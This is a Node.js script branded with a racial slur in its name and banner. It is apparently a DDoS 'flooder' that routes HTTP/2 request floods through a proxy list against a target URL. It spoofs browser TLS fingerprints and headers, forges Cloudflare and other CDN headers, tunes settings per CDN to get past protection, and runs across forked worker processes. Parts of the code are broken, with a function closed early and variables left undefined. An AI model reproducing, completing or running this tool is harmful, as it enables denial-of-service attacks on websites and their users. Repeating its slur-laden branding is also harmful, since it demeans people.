const net = require("net");
const http = require("http");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const crypto = require("crypto");
const dns = require('dns');
const fs = require("fs");
var colors = require("colors");
const util = require('util');
const chalk = require('chalk');
const fetch = require('node-fetch');
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function getRandomTLSCiphersuite() {
    const tlsCiphersuites = [
        'TLS_AES_128_CCM_8_SHA256',
        'TLS_AES_128_CCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_AES_128_GCM_SHA256',
    ];

    const randomCiphersuite = tlsCiphersuites[Math.floor(Math.random() * tlsCiphersuites.length)];

    return randomCiphersuite;
}

const randomTLSCiphersuite = getRandomTLSCiphersuite();
function randstra(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
function generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        const randomStringArray = Array.from({
            length
        }, () => {
            const randomIndex = Math.floor(Math.random() * characters.length);
            return characters[randomIndex];
        });

        return randomStringArray.join('');
    }
const lookupPromise = util.promisify(dns.lookup);

let isp;
let HeadersResponse;
async function getIPAndISP(url) {
    try {
        const {
            address
        } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            console.log(chalk.cyan('\nISP Information:'));
            console.log(`${chalk.bold('Target URL:')} ${chalk.yellow(url)}`);
            console.log(`${chalk.bold('ISP:')} ${chalk.magenta(isp)}`);
function random() {
		  		  if (isp === "Cloudflare, Inc.") {
    HeadersResponse = {
    ['Alt-Svc'] : `h3=":443";ma=86400`,
    ['Cache-Control'] : "no-store, no-cache, must-revalidate",
    ['Cf-Cache-Status'] : "DYNAMIC",
    ['Cf-Ray'] :  randstra(15) + "f-SIN",
   ['Content-Encoding'] : "br",
   ['Content-Type'] : "text/html; charset=utf-8",
   ['Nel'] : `{"success_fraction":0,"report_to":"cf-nel","max-age":604800}`,
   ['Permissions-Policy'] : "geolocation=(), camera=(), microphone()",
  ['Referrer-Policy'] : "strict-origin-when-cross-origin",
   ['Pragma'] : "no-cache",
   ['Server'] : "cloudflare",
   ['Server-Timing'] : "cfExtPri",
   ['Strict-Transport-Security'] : "max-age=31536000; includeSubDomains",
   ['Vary'] : "Accept-Encoding",
  ['X-Frame-Options'] : "SAMEORIGIN",
  ['X-Rm'] : "GM",
  ['X-Xss-Protection'] : "1; mode=block",
 }; 
					} else if (isp === "Akamai International B.V.") {
 HeadersResponse = {
    ['Alt-Svc'] : `h3=":443";ma=93600`,
    ['Cache-Control'] : "max-age=604800",
    ['X-Akam-Sw-Version'] : "0.5.0",
    ['Content-Lenght'] : randstra(3) + generateRandomString(2) + randstra(1) + generateRandomString(1) + randstra(1) + 
generateRandomString(1) + randstra(2) + generateRandomString(2) + randstra(2) + generateRandomString(1) + "--preconnect;akamai",
   ['Content-Encoding'] : "gzip",
   ['Content-Type'] : "text/html; charset=utf-8",
   ['Nel'] : `{"success_fraction":0,"report_to":"cf-nel","max-age":604800}`,
   ['Pragma'] : "no-cache",
   ['Server'] : "cloudflare",
   ['Vary'] : "Accept-Encoding",
   ['X-Akamai-Transformed'] : generateRandomString(7) + "0" + generateRandomString(8) + "1" + generateRandomString(9) + "2",
  ['X-Content-Type-Options'] : "nosniff",
  ['X-Frame-Options'] : "SAMEORIGIN",
  ['X-Xss-Protection'] : generateRandomString(22) + "mode=block; report=" + generateRandomString(11),
 }; 

					} else if (isp === "Akamai Technologies, Inc.") {
 HeadersResponse = {
    ['Alt-Svc'] : `h3=":443";ma=93600`,
    ['Cache-Control'] : "max-age=604800",
    ['X-Akam-Sw-Version'] : "0.5.0",
    ['Content-Lenght'] : randstra(3) + generateRandomString(2) + randstra(1) + generateRandomString(1) + randstra(1) + 
generateRandomString(1) + randstra(2) + generateRandomString(2) + randstra(2) + generateRandomString(1) + "--preconnect;akamai",
   ['Content-Encoding'] : "gzip",
   ['Content-Type'] : "text/html; charset=utf-8",
   ['Nel'] : `{"success_fraction":0,"report_to":"cf-nel","max-age":604800}`,
   ['Pragma'] : "no-cache",
   ['Server'] : "cloudflare",
   ['Vary'] : "Accept-Encoding",
   ['X-Akamai-Transformed'] : generateRandomString(7) + "0" + generateRandomString(8) + "1" + generateRandomString(9) + "2",
  ['X-Content-Type-Options'] : "nosniff",
  ['X-Frame-Options'] : "SAMEORIGIN",
  ['X-Xss-Protection'] : generateRandomString(22) + "mode=block; report=" + generateRandomString(11),
 }; 

} else if (isp === "Fastly, Inc.") {
    HeadersResponse = {
    ['Alt-Svc'] : `h3=":443";ma=86400,h3-29=":443";ma=86400`,
    ['Cache-Control'] : "max-age=0, private, must-revalidate",
    ['Etag'] : randstra(3) + generateRandomString(4) + randstra(4) + generateRandomString(7),
    ['Server'] : "Artisanal bits",
   ['Strict-Transport-Security'] : "max-age=31536000",
   ['X-Cache-Hits'] : randstra(3),
   ['X-Served-By'] : "cache-sin-" + generateRandomString(4) + randstra(7) + "-SIN",
   ['X-Timer'] : "S" + randstra(10) + "." + randstra(6) + ",VS0,VE1" ,
 }; 
}
return HeadersResponse
}
setInterval(random,500)
          } else {
            return;
        }
    } catch (error) {
        return;
    }
}
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'application/json,text/html;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'application/json,application/xml;q=0.9,text/html;q=0.8,*/*;q=0.7',
    'application/json;q=0.9,application/xml;q=0.8,*/*;q=0.7',
    'text/plain;q=0.9,text/html;q=0.8,*/*;q=0.7',
    'application/pdf,text/html;q=0.8,*/*;q=0.7',
    'image/avif,image/webp,image/apng,image/png,image/jpeg,*/*;q=0.8',
    'text/html,application/xhtml+xml;q=0.8,image/avif,image/webp,*/*;q=0.7',
    'text/html,application/xhtml+xml;q=0.9,image/avif,image/webp,image/png,*/*;q=0.8',
    '*/*;q=0.8',
];

    cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'private',
    'must-revalidate',
];

const language_header = [
    // English
    "en-US,en;q=0.8",
    "en-US,en;q=0.5",
    "en-US,en;q=0.9",
    "en-US,en;q=0.7",
    "en-US,en;q=0.6",

    // Chinese (Simplified)
    "zh-CN,zh;q=0.8",
    "zh-CN,zh;q=0.5",
    "zh-CN,zh;q=0.9",
    "zh-CN,zh;q=0.7",
    "zh-CN,zh;q=0.6",

    // Chinese (Traditional)
    "zh-TW,zh;q=0.8",
    "zh-TW,zh;q=0.5",
    "zh-TW,zh;q=0.9",

    // Spanish
    "es-ES,es;q=0.8",
    "es-ES,es;q=0.5",
    "es-ES,es;q=0.9",
    "es-ES,es;q=0.7",
    "es-ES,es;q=0.6",

    // French
    "fr-FR,fr;q=0.8",
    "fr-FR,fr;q=0.5",
    "fr-FR,fr;q=0.9",
    "fr-FR,fr;q=0.7",
    "fr-FR,fr;q=0.6",

    // German
    "de-DE,de;q=0.8",
    "de-DE,de;q=0.5",
    "de-DE,de;q=0.9",
    "de-DE,de;q=0.7",
    "de-DE,de;q=0.6",

    // Italian
    "it-IT,it;q=0.8",
    "it-IT,it;q=0.5",
    "it-IT,it;q=0.9",
    "it-IT,it;q=0.7",
    "it-IT,it;q=0.6",

    // Japanese
    "ja-JP,ja;q=0.8",
    "ja-JP,ja;q=0.5",
    "ja-JP,ja;q=0.9",
    "ja-JP,ja;q=0.7",
    "ja-JP,ja;q=0.6",

    // Korean
    "ko-KR,ko;q=0.8",
    "ko-KR,ko;q=0.5",
    "ko-KR,ko;q=0.9",

    // Portuguese (Brazil)
    "pt-BR,pt;q=0.8",
    "pt-BR,pt;q=0.5",
    "pt-BR,pt;q=0.9",

    // Dutch
    "nl-NL,nl;q=0.8",
    "nl-NL,nl;q=0.5",
    "nl-NL,nl;q=0.9",

    // English + Russian
    "en-US,en;q=0.8,ru;q=0.6",
    "en-US,en;q=0.5,ru;q=0.3",
    "en-US,en;q=0.9,ru;q=0.7",
    "en-US,en;q=0.7,ru;q=0.5",
    "en-US,en;q=0.6,ru;q=0.4",

    // English + Chinese
    "en-US,en;q=0.8,zh-CN;q=0.6",
    "en-US,en;q=0.7,zh-TW;q=0.5",

    // English + Spanish
    "en-US,en;q=0.8,es-ES;q=0.6",
    "en-US,en;q=0.7,es-ES;q=0.5",

    // English + French
    "en-US,en;q=0.8,fr-FR;q=0.6",
    "en-US,en;q=0.7,fr-FR;q=0.5",

    // English + German
    "en-US,en;q=0.8,de-DE;q=0.6",
    "en-US,en;q=0.7,de-DE;q=0.5",

    // English + Korean
    "en-US,en;q=0.8,ko-KR;q=0.6",

    // English + Japanese
    "en-US,en;q=0.8,ja-JP;q=0.6",

    // English + Portuguese
    "en-US,en;q=0.8,pt-BR;q=0.6",

    // English + Dutch
    "en-US,en;q=0.8,nl-NL;q=0.6",

    // English + Chinese + Russian
    "en-US,en;q=0.7,zh-CN;q=0.5,ru;q=0.3",

    // English + Spanish + French
    "en-US,en;q=0.7,es-ES;q=0.5,fr-FR;q=0.3",
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
]
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_NO_TICKET |
    crypto.constants.SSL_OP_NO_COMPRESSION |
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_TLSEXT_PADDING |
    crypto.constants.SSL_OP_ALL |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
if (process.argv.length < 7) {
    console.clear();

     console.log(
          chalk.white.bold('Telegram:           ') + chalk.blue.bold('    t.me/ThaiDuongScript')
     );
     console.log(
          chalk.white.bold('Product:             ') + chalk.magenta.bold('   Nigger Flooder v1.0')
     );
     console.log(
          chalk.white.bold('Date:                   ') + chalk.bgWhite.black.bold(new Date().toLocaleString('vn'))
     );


     console.log(
          chalk.underline.white.bold('\nUsage') + chalk.reset(':')
     );
     console.log(
          chalk.white(`     node ${process.argv[1]} <target> <time> <ratelimit> <threads> <proxy>`)
     );
     console.log(
          chalk.underline.white.bold('\nExample') + chalk.reset(':')
     );
     console.log(
          chalk.italic.white(`     node ${process.argv[1]} https://iristeam.sbs/ 120 10 10 proxy.txt `)
     );
    process.exit();
}
const secureProtocol = "TLS_client_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    
    
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const targetURL = parsedTarget.host;
const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;
function getSettingsBasedOnISP(isp) {
        const defaultSettings = {
            headerTableSize: 65536,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false,
            maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
            maxFrameSize: 40000,
            enableConnectProtocol: false,
        };
    
        const settings = { ...defaultSettings };
    
        switch (isp) {
        case 'Cloudflare, Inc.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = Math.random() > 0.5 ? "1000" : "10000";
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = Math.random() > 0.25 ? "40000" : "131072";
            settings.maxHeaderListSize = Math.random() > 0.5 ? "262144" : "524288";
            settings.enablePush = false;
            break;
        case 'FDCservers.net':
        case 'OVH SAS':
        case 'VNXCLOUD':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65536;
            settings.maxFrameSize = 16777215;
            settings.maxConcurrentStreams = 128;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Akamai Technologies, Inc.':
        case 'Akamai International B.V.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = 16384;
            settings.maxHeaderListSize = 32768;
            break;
        case 'Fastly, Inc.':
        case 'Optitrust GmbH':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Ddos-guard LTD':
            settings.priority = 1;
            settings.maxConcurrentStreams = 1;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16777215;
            settings.maxHeaderListSize = 262144;
            break;
        case 'Amazon.com, Inc.':
        case 'Amazon Technologies Inc.':
            settings.priority = 0;
            settings.maxConcurrentStreams = 100;
            settings.initialWindowSize = 65535;
            settings.maxHeaderListSize = 262144;
            break;
        case 'Microsoft Corporation':
        case 'Vietnam Posts and Telecommunications Group':
        case 'VIETNIX':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 8388608;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Google LLC':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 1048576;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 137216;
            break;
        default:
            settings.headerTableSize = 65535;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxHeaderListSize = 261144;
            settings.maxFrameSize = 16384;
            break;
    }

    return settings;
}
if (cluster.isMaster) {
    console.clear()
    
    getIPAndISP(targetURL);
var count = 1;
    

setInterval(() => {

console.log(`[${'NIGGERFLOOD'.magenta.bold}] | ${colors.bold('Time')}: [${colors.underline(args.time-count)}], ${colors.bold('Target')}: [${colors.underline(args.target)}] |${colors.bold('Ratelimit')}: [${colors.underline(args.Rate)}] |${colors.bold('Threads')}: [${colors.underline(args.threads)}]`);
            count++;
        }, 1000);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

console.log(chalk.yellow('[Reset] Restarting the script') + ` ${chalk.red(RESTART_DELAY)} ms...`);
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
        console.log(chalk.red('\n[Ram] Maximum RAM usage:') + ` ${chalk.red(ramPercentage.toFixed(2))} %`);
            restartScript();
        }
    };
    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder)
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
        const buffer = new Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true)
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

    }
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

var valueofgod = 1;
var signature_0x1 = getRandomInt(104, 134);
var cookie;
var signature_0x2 = getRandomInt(80, 99);
var signature_0x3 = getRandomInt(70, 99);

const mobiledd = getRandomInt(0, 1);

const randomValue = Math.random();



const user_agent = randomValue < 0.2 ? 
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.0.0 Safari/537.36` :
    randomValue < 0.2 ?
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.0.0 Safari/537.36` :
    randomValue < 0.2 ?
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.0.0 Safari/537.36` :
    randomValue < 0.2 ?
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.0.0 Edg/${signature_0x1}.0.0.0` :
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.0.0 OPR/${signature_0x1}.0.0.0`;

const u = [
    user_agent,
];

function parse_headers(user_agent) {
    const osRegex = /\(([^)]+)\)/;
    const chromeRegex = /Chrome\/(\d+)/;

    const osMatch = user_agent.match(osRegex);
    const chromeMatch = user_agent.match(chromeRegex);

    let os = 'Windows';
    if (osMatch) {
        const osDetails = osMatch[1];
        if (osDetails.includes('Macintosh')) {
            os = 'macOS';
        } else if (osDetails.includes('Linux')) {
            os = 'Linux';
        } else if (osDetails.includes('Windows')) {
            os = 'Windows';
        }
    }

    const chromeVersion = chromeMatch ? parseInt(chromeMatch[1], 10) : 134;

    return {
        os: os,
        version: chromeVersion
    };
}
let chromium = parse_headers(user_agent)
const ngu = ` ${chromium.os}`;

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}
const randstrsValue = randstrs(10);

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    
        
        let interval = 1;
    }

    function randstrr(length) {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
        let result = "";
        const charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

    function randstr(length) {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let result = "";
        const charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

    

    const uap = u[Math.floor(Math.random() * u.length)];
 
const method = [
"GET",
"POST",
"PUT",
"PATCH",
"DELETE",
"OPTIONS",
"HEAD",
"CONNECTION",
"COPY",
"MKACTIVITY",
"SEARCH",
"MERGE",
"MOVE",
"SUBSCRIBE",
"UNSUBSCRIBE",
"REPORT",
"PROPPATCH",
"PROPFIND",
"MKCOL",
"ACL",
"UPDATE",
"UNLOCK",
"LOCK",
];

const urihost = [
    'google.com',
    'youtube.com',
    'facebook.com',
    'baidu.com',
    'wikipedia.org',
    'x.com',
    'amazon.com',
    'yahoo.com',
    'reddit.com',
    'netflix.com'
];
const clength = urihost[Math.floor(Math.random() * urihost.length)];
    let headers = {
        ":authority": parsedTarget.host,
        ":method": method[Math.floor(Math.random() * method.length)],
        "x-forwarded-for": parsedProxy[0],
        'priority': `u=${getRandomInt(0,5)}, i`,
        "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
        "accept-encoding": "gzip, br",
        "Accept": accept_header[Math.floor(Math.random() * accept_header.length)],
        ":path": parsedTarget.path,
        ":scheme": "https",
        "sec-ch-ua-platform": ngu,
        "cache-control": Math.random() > 0.5 ? "max-age=0" : "no-cache",
        "sec-ch-ua": `\"Google Chrome\";v=\"${signature_0x1}\", \"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"${signature_0x1}\"`,
        "sec-ch-mobile": "?0",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": Math.random() > 0.5 ? "same-origin" : "none",
        "sec-fetch-user": "?1",
        "user-agent": process.argv[8],
        "Upgrade-Insecure-Requests": "1",
       "Origin": "https://www." + clength + "?page=" + randstr(15) + "-" + randstr(3) + "&" + randstr(6) + "/from/" + generateRandomString(12),
        "Referer": "https://www." + clength + "?page=" + randstr(15) + ":" + randstr(9) + "&" + "https://" + parsedTarget.host + "&" + generateRandomString(4) + "_*" + generateRandomString(5) + "#" + generateRandomString(6) ,
        "X-Cache": Math.random() > 0.5 ? "HIT" : "MISS",
        "X-Cache-LiteSpeed": "LiteSpeed" + "V." + randstr(15),
       "cookie" : process.argv[7],
    }
const country = [
  "A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU",
  "AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO",
  "BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK",
  "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO",
  "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB",
  "GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW",
  "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS",
  "IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ",
  "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF",
  "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX",
  "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA",
  "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO",
  "RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN",
  "SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL",
  "TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC",
  "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW"
];
 


let headercloudflare = {
  'If-Modified-Since': httpTime,
  'cf-cache-status': 'DYNAMIC',
'CF-IPCountry': country[Math.floor(Math.random() * country.length)],
  'CF-ConnectingIP': parsedProxy[0],
  'CF-Worker': parsedTarget.host,
  'X-Forwarded-Proto':'https',
}

 const agent = new http.Agent({
  keepAlive: true,
  keepAliveMsecs: 400000,
  maxSockets: 70000,
  maxTotalSockets: 12000,
});

    const proxyOptions = {
        agent: agent,
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        method: 'CONNECT',
        address: parsedTarget.host + ':443',
        timeout: 100,
    };
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true)

        

        const tlsOptions = {                
                ALPNProtocols: [
                    "h2"
                ],
            port: parsedPort,
            secure: true,            
            ciphers: ciphers,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureOptions: secureOptions,
            secureContext: secureContext,
            requestCert: true,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };
        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            settings: getSettingsBasedOnISP(isp),
            createConnection: () => tlsConn,
            socket: connection,
        });
        

        client.setMaxListeners(0);
        client.settings(getSettingsBasedOnISP(isp));
        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                 dynHeaders = {
                        ...headers,
                      ...HeadersResponse,
                       ...headercloudflare,
                   };
                  const request = client.request(dynHeaders)
                        .on("response", response => {
                                                        
                            if (response[":status"] === 429) {
                                const currentTime = Date.now();
                                args.Rate = args.Rate.filter(limit => currentTime - limit.timestamp <= 60000);
                                (() => {
                                    const currentTime = Date.now();
                                    args.Rate = args.Rate.filter(limit => currentTime - limit.timestamp <= 60000);
                                })();
                                args.Rate.push({
                                    proxyAddr,
                                    timestamp: Date.now()
                                });
                            }
                            request.close();
                            request.destroy();
                            return
                        });
                    request.end();

                }
            }, interval);
            return;
        });

        if (streams.length > 0) {
            const streamToReset = streams[0];

            client.rstStream(streamToReset.id, 1);

            return;
        }

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });
        client.on("timeout", () => {
            client.destroy();
            connection.destroy();
            return
        });
        client.on("error", (error) => {

            client.destroy();
            connection.destroy();
            return
        });
    });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
const client = http2.connect(parsed.href, clientOptions, function() {});